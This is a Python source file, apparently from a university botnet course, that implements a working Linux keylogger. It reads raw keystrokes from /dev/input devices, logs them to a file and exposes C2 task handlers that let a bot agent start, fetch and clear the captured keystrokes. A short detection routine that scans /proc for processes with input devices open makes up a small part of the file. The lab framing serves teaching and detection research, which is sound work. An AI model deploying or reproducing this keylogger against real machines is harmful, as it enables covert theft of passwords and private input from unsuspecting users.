"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Keylogger (Attack + Defense)
 Environment: ISOLATED VM LAB ONLY
====================================================

Attack side (EvdevKeylogger):
  Linux keylogger using the kernel's evdev interface.
  Reads raw keyboard events from /dev/input/event* directly,
  bypassing the X11/Wayland display layer entirely.

  This is why kernel-level keyloggers are hard to detect
  from userspace: they tap the hardware event stream before
  the display server ever sees it.

  Key concepts demonstrated:
    - struct input_event format (kernel ABI)
    - Reading /dev/input/event* without X11 dependency
    - Background thread logging to a configurable file
    - Key code → character mapping for readable output
    - Start/stop/retrieve commands matching the C2 task API

  Output file: /tmp/botnet_lab_keylogs.txt
  (Captures only keystrokes typed INSIDE the lab VM)

Defense side (KeyloggerDetector — already in ids_engine_endpoint.py):
  See ids_engine_endpoint.py, class KeyloggerDetector.
  Engine 22A: scans /proc/[pid]/fd for open /dev/input/event*
  descriptors held by non-system processes.

MITRE: T1056.001 (Input Capture: Keylogging)

CLI:
  sudo python3 keylogger_sim.py --start           (background)
  sudo python3 keylogger_sim.py --stop
  sudo python3 keylogger_sim.py --dump            (print captured)
  sudo python3 keylogger_sim.py --device /dev/input/eventN
  sudo python3 keylogger_sim.py --list-devices    (find keyboard)
  sudo python3 keylogger_sim.py --demo 30         (capture 30s)
  sudo python3 keylogger_sim.py --detect          (IDS demo)

Note: requires root (or group 'input') to open /dev/input/event*.
"""

import os
import sys
import time
import glob
import struct
import threading
import argparse
from datetime import datetime
from collections import defaultdict, deque
from pathlib import Path

# ── Lab output path ───────────────────────────────────────────
LOG_PATH = "/tmp/botnet_lab_keylogs.txt"


# ════════════════════════════════════════════════════════════════
#  KERNEL INPUT EVENT CONSTANTS
#  From <linux/input.h> — these are stable kernel ABI
# ════════════════════════════════════════════════════════════════

# struct input_event { timeval (8 or 16 bytes), __u16 type,
#                      __u16 code, __s32 value }
# On 64-bit Linux: timeval = 2 × int64 → total 24 bytes
INPUT_EVENT_FMT  = "llHHi"
INPUT_EVENT_SIZE = struct.calcsize(INPUT_EVENT_FMT)

EV_KEY = 0x01    # key event type
KEY_PRESS   = 1
KEY_REPEAT  = 2

# Key code → printable character mapping (subset of US QWERTY)
# Full table follows linux/input-event-codes.h KEY_* constants
KEYMAP = {
    # Row 1
    2:  ("1","!"), 3:  ("2","@"), 4:  ("3","#"), 5:  ("4","$"),
    6:  ("5","%"), 7:  ("6","^"), 8:  ("7","&"), 9:  ("8","*"),
    10: ("9","("), 11: ("0",")"), 12: ("-","_"), 13: ("=","+"),
    14: ("[BKSP]",""),
    # Row 2
    15: ("[TAB]",""), 16: ("q","Q"), 17: ("w","W"), 18: ("e","E"),
    19: ("r","R"),    20: ("t","T"), 21: ("y","Y"), 22: ("u","U"),
    23: ("i","I"),    24: ("o","O"), 25: ("p","P"),
    26: ("[","{"  ),  27: ("]","}"  ), 28: ("[ENTER]","\n"),
    # Row 3
    30: ("a","A"), 31: ("s","S"), 32: ("d","D"), 33: ("f","F"),
    34: ("g","G"), 35: ("h","H"), 36: ("j","J"), 37: ("k","K"),
    38: ("l","L"), 39: (";",":"), 40: ("'",'"'), 41: ("`","~"),
    # Row 4
    42: "[LSHIFT]", 43: ("\\","|"), 44: ("z","Z"), 45: ("x","X"),
    46: ("c","C"),  47: ("v","V"), 48: ("b","B"), 49: ("n","N"),
    50: ("m","M"),  51: (",","<"), 52: (".",">"), 53: ("/","?"),
    54: "[RSHIFT]",
    # Special
    29: "[CTRL]", 56: "[ALT]", 57: (" "," "), 58: "[CAPS]",
    59: "[F1]",  60: "[F2]",  61: "[F3]",  62: "[F4]",
    63: "[F5]",  64: "[F6]",  65: "[F7]",  66: "[F8]",
    67: "[F9]",  68: "[F10]", 87: "[F11]", 88: "[F12]",
    103: "[UP]", 105: "[LEFT]", 106: "[RIGHT]", 108: "[DOWN]",
    111: "[DEL]", 110: "[INS]", 102: "[HOME]", 107: "[END]",
}

SHIFT_KEYS = {42, 54}   # LSHIFT, RSHIFT
CTRL_KEYS  = {29, 97}   # LCTRL, RCTRL


# ════════════════════════════════════════════════════════════════
#  ATTACK SIDE: Evdev Keylogger
# ════════════════════════════════════════════════════════════════

class EvdevKeylogger:
    """
    Linux keylogger via /dev/input/event*.

    Taps the kernel input event stream directly, before X11/Wayland
    processes the events. This makes it display-server independent —
    works in TTY, X11, and Wayland sessions equally.

    Teaching points:
      1. struct input_event is the kernel ABI for all input devices
      2. EV_KEY events have type=1; value=1 is press, 0 is release
      3. Shift state is tracked by monitoring LSHIFT/RSHIFT key codes
      4. Opening /dev/input/event* requires CAP_DAC_READ_SEARCH or
         membership in the 'input' group — a common misconfiguration
         on desktop Linux systems

    Detection artifacts (Engine 22A targets these):
      - Non-system process holds an open file descriptor to
        /dev/input/event* (visible in /proc/[pid]/fd/)
      - inotify watch on /dev/input/ directory
      - Write activity to a log file concurrent with input reads
    """

    def __init__(self, device_path: str = None,
                 log_path: str = LOG_PATH):
        self._device  = device_path or self._find_keyboard()
        self._log     = log_path
        self._thread  = None
        self._stop    = threading.Event()
        self._shift   = False
        self._buffer  = []
        self._lock    = threading.Lock()
        self._started = False

    @staticmethod
    def _find_keyboard() -> str | None:
        """
        Identify the keyboard event device from /proc/bus/input/devices.
        Looks for a device with EV=120013 (keyboard event flags).
        Falls back to the first event device if parsing fails.
        """
        try:
            with open("/proc/bus/input/devices") as f:
                content = f.read()
            blocks = content.split("\n\n")
            for block in blocks:
                if "EV=" not in block:
                    continue
                # EV=120013 means keyboard (KEY, LED, REP, MSC flags set)
                ev_line = next(
                    (l for l in block.splitlines() if l.startswith("B: EV=")), ""
                )
                ev_val = int(ev_line.replace("B: EV=", "").strip(), 16) \
                         if ev_line else 0
                if ev_val & 0x2:  # EV_KEY capable
                    handler_line = next(
                        (l for l in block.splitlines()
                         if "Handlers=" in l), ""
                    )
                    for token in handler_line.split():
                        if token.startswith("event"):
                            path = f"/dev/input/{token}"
                            if os.path.exists(path):
                                return path
        except Exception:
            pass

        # Fallback: return first event device
        devices = sorted(glob.glob("/dev/input/event*"))
        return devices[0] if devices else None

    @staticmethod
    def list_devices() -> list:
        """Return all available input event devices with their names."""
        devices = []
        try:
            with open("/proc/bus/input/devices") as f:
                content = f.read()
            for block in content.split("\n\n"):
                name_line = next(
                    (l for l in block.splitlines() if l.startswith("N: Name=")), ""
                )
                handler_line = next(
                    (l for l in block.splitlines() if "Handlers=" in l), ""
                )
                name = name_line.replace("N: Name=", "").strip().strip('"')
                for token in handler_line.split():
                    if token.startswith("event"):
                        path = f"/dev/input/{token}"
                        if os.path.exists(path):
                            devices.append({"path": path, "name": name})
        except Exception:
            pass
        return devices

    def _decode_key(self, code: int) -> str:
        """Convert a key code to its character, respecting shift state."""
        mapping = KEYMAP.get(code)
        if mapping is None:
            return f"[KEY_{code}]"
        if isinstance(mapping, str):
            return mapping
        # mapping is (normal, shifted)
        return mapping[1] if self._shift else mapping[0]

    def _read_loop(self):
        """Background thread: read raw input events and log keystrokes."""
        if not self._device:
            print("[Keylogger] No keyboard device found. "
                  "Run: sudo python3 keylogger_sim.py --list-devices")
            return

        try:
            fd = open(self._device, "rb")
        except PermissionError:
            print(f"[Keylogger] Permission denied: {self._device}\n"
                  f"  Run with sudo or add user to 'input' group:\n"
                  f"  sudo usermod -aG input $USER")
            return
        except FileNotFoundError:
            print(f"[Keylogger] Device not found: {self._device}")
            return

        print(f"[Keylogger] Capturing from {self._device} → {self._log}")

        with open(self._log, "a") as logf:
            logf.write(
                f"\n[Keylogger started: {datetime.now().isoformat()}]\n"
            )
            logf.flush()

            while not self._stop.is_set():
                try:
                    raw = fd.read(INPUT_EVENT_SIZE)
                    if len(raw) < INPUT_EVENT_SIZE:
                        break

                    tv_sec, tv_usec, ev_type, ev_code, ev_value = \
                        struct.unpack(INPUT_EVENT_FMT, raw)

                    if ev_type != EV_KEY:
                        continue
                    if ev_value not in (KEY_PRESS, KEY_REPEAT):
                        continue

                    # Track shift state
                    if ev_code in SHIFT_KEYS:
                        self._shift = (ev_value == KEY_PRESS)
                        continue

                    char = self._decode_key(ev_code)

                    with self._lock:
                        self._buffer.append(char)
                        if len(self._buffer) > 10000:
                            self._buffer = self._buffer[-5000:]

                    logf.write(char)
                    if char == "[ENTER]" or len(self._buffer) % 50 == 0:
                        logf.flush()

                except (OSError, struct.error):
                    break

        fd.close()
        print(f"[Keylogger] Stopped. Log: {self._log}")

    def start(self) -> bool:
        """Start the keylogger in a background thread."""
        if self._started:
            print("[Keylogger] Already running.")
            return False
        self._stop.clear()
        self._thread = threading.Thread(
            target=self._read_loop, daemon=True, name="keylogger"
        )
        self._thread.start()
        self._started = True
        return True

    def stop(self):
        """Stop the keylogger."""
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=2)
        self._started = False
        print("[Keylogger] Stopped.")

    def dump(self) -> str:
        """Return captured keystrokes as a string."""
        with self._lock:
            return "".join(self._buffer)

    def get_log_path(self) -> str:
        return self._log

    def is_running(self) -> bool:
        return self._started and not self._stop.is_set()


# ════════════════════════════════════════════════════════════════
#  C2 TASK HANDLER INTEGRATION
#  Add these task types to bot_agent's command dispatcher
# ════════════════════════════════════════════════════════════════

_keylogger_instance: EvdevKeylogger | None = None

def handle_c2_task(task: dict) -> dict:
    """
    Handle C2 tasks for keylogger control.

    Task types:
      {"type": "start_keylogger"}
      {"type": "stop_keylogger"}
      {"type": "get_keylogs"}
      {"type": "clear_keylogs"}

    Wire into c2_server.py task types list and bot_agent task handler.
    """
    global _keylogger_instance
    t = task.get("type")

    if t == "start_keylogger":
        if _keylogger_instance and _keylogger_instance.is_running():
            return {"status": "already_running", "log": LOG_PATH}
        _keylogger_instance = EvdevKeylogger()
        ok = _keylogger_instance.start()
        return {"status": "started" if ok else "failed", "log": LOG_PATH}

    elif t == "stop_keylogger":
        if _keylogger_instance:
            _keylogger_instance.stop()
        return {"status": "stopped"}

    elif t == "get_keylogs":
        if _keylogger_instance:
            data = _keylogger_instance.dump()
        else:
            try:
                with open(LOG_PATH) as f:
                    data = f.read()
            except FileNotFoundError:
                data = ""
        return {"status": "ok", "keylogs": data, "length": len(data)}

    elif t == "clear_keylogs":
        try:
            open(LOG_PATH, "w").close()
        except Exception:
            pass
        if _keylogger_instance:
            with _keylogger_instance._lock:
                _keylogger_instance._buffer.clear()
        return {"status": "cleared"}

    return {"error": f"unknown task type: {t}"}


# ════════════════════════════════════════════════════════════════
#  DETECTION SIDE: IDS integration note
#  Full implementation is in ids_engine_endpoint.py Engine 22A
# ════════════════════════════════════════════════════════════════

def run_detection_demo():
    """
    Demonstrate how IDS Engine 22A detects this keylogger.
    Shows the /proc/fd scan that would catch a running keylogger.
    """
    print("[IDS-E22A] Keylogger detection via /proc/[pid]/fd scan")
    print("[IDS-E22A] Scanning for processes with /dev/input/event* open...")

    INPUT_DEVS = set(glob.glob("/dev/input/event*"))
    LEGITIMATE = {"Xorg", "X", "libinput", "wayland", "pipewire"}
    found = []

    for pid_str in os.listdir("/proc"):
        if not pid_str.isdigit():
            continue
        fd_dir = f"/proc/{pid_str}/fd"
        try:
            for fd in os.listdir(fd_dir):
                try:
                    target = os.readlink(f"{fd_dir}/{fd}")
                    if target in INPUT_DEVS:
                        comm = open(f"/proc/{pid_str}/comm").read().strip()
                        if not any(leg in comm for leg in LEGITIMATE):
                            found.append({
                                "pid":     int(pid_str),
                                "process": comm,
                                "device":  target,
                                "fd":      fd,
                            })
                except (FileNotFoundError, PermissionError, OSError):
                    pass
        except (FileNotFoundError, PermissionError):
            pass

    if found:
        for entry in found:
            print(f"\n  ⚠ ALERT: PID={entry['pid']} ({entry['process']}) "
                  f"has {entry['device']} open (fd={entry['fd']})")
            print(f"    MITRE: T1056.001 — Input Capture: Keylogging")
    else:
        print("  No suspicious input device access detected.")
        print("  (Start the keylogger first to see a detection hit)")


# ════════════════════════════════════════════════════════════════
#  CLI
# ════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Keylogger — Attack + Defense Research Module")
    parser.add_argument("--start",        action="store_true")
    parser.add_argument("--stop",         action="store_true")
    parser.add_argument("--dump",         action="store_true")
    parser.add_argument("--demo",         type=int, metavar="SECONDS",
                        help="Capture for N seconds then dump")
    parser.add_argument("--list-devices", action="store_true")
    parser.add_argument("--device",       type=str, default=None)
    parser.add_argument("--detect",       action="store_true")
    args = parser.parse_args()

    if args.list_devices:
        devs = EvdevKeylogger.list_devices()
        if devs:
            print(f"Found {len(devs)} input device(s):")
            for d in devs:
                print(f"  {d['path']}  →  {d['name']}")
        else:
            print("No input devices found in /proc/bus/input/devices")
        sys.exit(0)

    if args.detect:
        run_detection_demo()
        sys.exit(0)

    kl = EvdevKeylogger(device_path=args.device)

    if args.start:
        kl.start()
        print(f"[Keylogger] Running. Log: {LOG_PATH}")
        print("[Keylogger] Press Ctrl+C to stop.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            kl.stop()

    elif args.stop:
        # Signal via stop file (for use when started as background process)
        kl.stop()

    elif args.dump:
        try:
            with open(LOG_PATH) as f:
                print(f.read())
        except FileNotFoundError:
            print(f"No log file at {LOG_PATH}")

    elif args.demo:
        print(f"[Keylogger] Demo: capturing for {args.demo}s...")
        print(f"[Keylogger] Type something in this terminal...")
        kl.start()
        time.sleep(args.demo)
        kl.stop()
        captured = kl.dump()
        print(f"\n[Keylogger] Captured ({len(captured)} chars):")
        print(f"  {repr(captured[:500])}")
        print(f"\n[Keylogger] Full log: {LOG_PATH}")
